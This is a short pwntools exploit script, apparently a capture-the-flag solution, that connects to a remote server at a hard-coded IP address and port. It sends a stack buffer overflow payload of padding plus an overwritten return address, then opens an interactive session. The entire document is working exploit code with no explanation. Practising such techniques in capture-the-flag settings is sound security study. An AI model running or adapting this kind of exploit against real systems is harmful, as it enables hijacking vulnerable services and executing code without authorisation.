from pwn import*
p=remote('8.130.110.158',2102)
# gdb.attach(p)
# p=process('')
payload=b'a'* (0x120+8)+ p64(0x4011B6)
p.sendline(payload)
p.interactive()